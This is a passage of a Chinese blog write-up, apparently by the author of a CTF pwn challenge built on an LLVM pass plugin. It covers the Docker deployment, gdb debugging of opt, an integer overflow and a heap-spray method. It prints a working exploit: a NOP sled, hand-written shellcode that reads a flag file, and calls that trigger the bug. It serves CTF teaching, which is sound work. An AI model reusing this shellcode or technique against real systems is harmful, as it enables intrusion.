/etc/xinetd.d/ctf</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="language-bash">     <span class="hljs-built_in">chmod</span> -R 777 /home/ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 744 /home/ctf/flag &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> 777 /home/ctf/run.sh    </span><br><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>



<p>run.sh</p>
<p>由于docker接收输入时最多一次性接收4096个字节，而exp长度大约为10000字节，所以循环读入，当用户输入ok时停止输入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>  <br>echo &quot;input your base64 encoded ir(.ll) :&quot;<br><br>input=&quot;&quot;<br>while true; do<br>    read -r -n 4096 segment<br>    if [ &quot;$segment&quot; == &quot;ok&quot; ]; then<br>        break<br>    else<br>        input+=&quot;$segment&quot;<br>    fi<br>done<br><br>echo &quot;$input&quot; | base64 -d &gt; exp<br>cat ./exp<br>./opt -disable-output \<br>    -load-pass-plugin=&#x27;./optimizer.so&#x27; \<br>    -passes=&quot;optimizer&quot; \<br>    &#x27;./exp&#x27;<br><br></code></pre></td></tr></table></figure>



<h4 id="docker建立镜像及测试"><a href="#docker建立镜像及测试" class="headerlink" title="docker建立镜像及测试"></a>docker建立镜像及测试</h4><p>使用Dockerfile创建镜像</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">docker build -t <span class="hljs-string">&quot;test&quot;</span> .<br></code></pre></td></tr></table></figure>

<p>启动镜像,这里8888对应ctf.xinetd和Dockerfile中expose的端口，nc时本地和远程都使用8090端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -p &quot;0.0.0.0:8090:9999&quot;  -h &quot;test&quot; --name=&quot;test&quot; test<br></code></pre></td></tr></table></figure>

<p>查看所有镜像</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">8090</span><br></code></pre></td></tr></table></figure>

<p>把.ll文件打包成一行base64</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">base64 test.<span class="hljs-keyword">ll</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; <span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure>

<p>进入容器排查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it 容器<span class="hljs-built_in">id</span> /bin/bash<br></code></pre></td></tr></table></figure>

<p>停止&#x2F;再次启动&#x2F;删除镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop 容器<span class="hljs-built_in">id</span><br>docker start 容器<span class="hljs-built_in">id</span><br>docker <span class="hljs-built_in">rm</span> 容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="2-考点"><a href="#2-考点" class="headerlink" title="2.考点"></a>2.考点</h3><h4 id="对llvm框架基本的认识"><a href="#对llvm框架基本的认识" class="headerlink" title="对llvm框架基本的认识"></a>对llvm框架基本的认识</h4><p>需要分析的是pass编译出来的so文件，opt在运行过程中会加载so</p>
<p>新版passmanager怎么找分析时的入口函数？在旧版passmanager中找runonfunction函数就可以了，新版中大概是这个样子，本题可以直接查找字符串交叉引用</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">llvm::PreservedAnalyses *__fastcall `anonymous <span class="hljs-keyword">namespace</span><span class="hljs-number">&#x27;</span>::easyheap::run<br></code></pre></td></tr></table></figure>

<h4 id="本地动态调试"><a href="#本地动态调试" class="headerlink" title="本地动态调试"></a>本地动态调试</h4><p>本地动态调试需要先启动gdb再set args，同时漏洞点是在so库中的，需要一步一步调到目标so中的目标函数。</p>
<p>首先</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">gdb</span> <span class="hljs-meta">opt</span><br></code></pre></td></tr></table></figure>

<p>进入gdb后</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> args -disable-output <span class="hljs-attribute">-load-pass-plugin</span>=<span class="hljs-string">&#x27;./optimizer.so&#x27;</span> <span class="hljs-attribute">-passes</span>=<span class="hljs-string">&quot;optimizer&quot;</span> <span class="hljs-string">&#x27;./test.ll&#x27;</span><br></code></pre></td></tr></table></figure>

<p>在main函数下断点</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure>

<p>用ida查看opt的main函数，跳过前面一大堆init函数，从lea开始调试，经过一次call就vmmap查看有没有pass的so库</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918001151.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230918001151"></p>
<p>最终发现在</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">llvm::cl::ParseCommandLineOptions<br></code></pre></td></tr></table></figure>

<p>函数中导入了pass的so库，从函数名也可以判断该函数是用来解析命令行参数的</p>
<p>那么，只要在该函数下断点即可</p>
<p>然后调到pass的入口函数</p>
<p>通过vmmap可以看到pass的so文件的基址</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003125.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230918003125"></p>
<p>如图，这里基址是0x7ffff7fae000，用ida打开so文件，可以找到入口函数相对基址的偏移</p>
<p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230918003254.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230918003254"></p>
<p>如图，偏移是EC70</p>
<p>相加后得到入口函数地址为0x7FFFF7FBCC70，直接在该地址下断点即可</p>
<p>调到入口函数后就和正常pwn题一样啦</p>
<p>tips:图中演示的文件不是最终的题目文件，偏移可能不一样</p>
<h4 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h4><p>buy函数存在整型溢出。在buy时可以buy负数的chunk，money会减去这个负数，导致无限money。</p>
<h4 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h4><p>在无限money的基础上，可以申请任意大小的chunk并编辑其中内容。</p>
<p>locate可以跳转到一个相对chunk基址有一定随机偏移的地址执行，通过调整buy的chunk的大小并调试可以使loacte随机执行的范围与chunk的范围有交叉，那么此时就有概率从chunk开始执行。</p>
<p>采用堆喷的思想，在要执行的shellcode前添加滑块如nop，填满chunk，那么随机执行到chunk中时，就可以滑到shellcode执行，否则就要正好随机执行到shellcode首字节，这是万分之一级别的概率。</p>
<p>给了buy的chunk地址，可以减少调试难度，同时也可以发现malloc的参数为负数时，本地或许可以申请到chunk，但是remote时会申请失败,需要在chunk构造上做调整。</p>
<p>另外，在locate中开启了沙箱，禁用了execve和execveat，所以要orw，这又涉及另一个问题 — 解析字符串时会被\x00截断，所以要手搓orw_shellcode。</p>
<p>优化后的shellcode如下，35字节，需要手动把可见字符改成\x的形式否则会把&#x2F;x12和3解析成0x123</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,0x67616c66  </span><br><span class="hljs-string">push rdx </span><br><span class="hljs-string">mov rdi,rsp</span><br><span class="hljs-string">xor esi,esi </span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov al,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov edi,eax</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">xor di,2 </span><br><span class="hljs-string">mov eax,edi</span><br><span class="hljs-string">syscall  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br></code></pre></td></tr></table></figure>

<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\xba\x66\x6c\x61\x67\x52\x48\x89\xe7\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x66\x83\xf7\x02\x89\xf8\x0f\x05<br></code></pre></td></tr></table></figure>



<h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><p>概率orw</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sell</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">buy</span><span class="hljs-params">(<span class="hljs-type">int</span> sz)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> idx,<span class="hljs-type">char</span>* buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">locate</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">35</span>+<span class="hljs-number">0x800</span>+<span class="hljs-number">0x1</span>] = <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xba\x66\x6c\x61\x67\x52\x48\x89\xe7\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x66\x83\xf7\x02\x89\xf8\x0f\x05&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;			<br>	<span class="hljs-built_in">sell</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-built_in">show</span>();<br>	<span class="hljs-built_in">buy</span>(<span class="hljs-number">-0x15000</span>);<br>	<span class="hljs-built_in">show</span>();<br>	<span class="hljs-built_in">sell</span>(<span class="hljs-number">1</span>);<br>	<span class="hljs-built_in">show</span>();<br>	<span class="hljs-built_in">buy</span>(<span class="hljs-number">0x1000</span>);<br>	<span class="hljs-built_in">show</span>();<br>	<span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,buf);<br>	<span class="hljs-built_in">locate</span>();<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="4-源码"><a href="#4-源码" class="headerlink" title="4.源码"></a>4.源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span 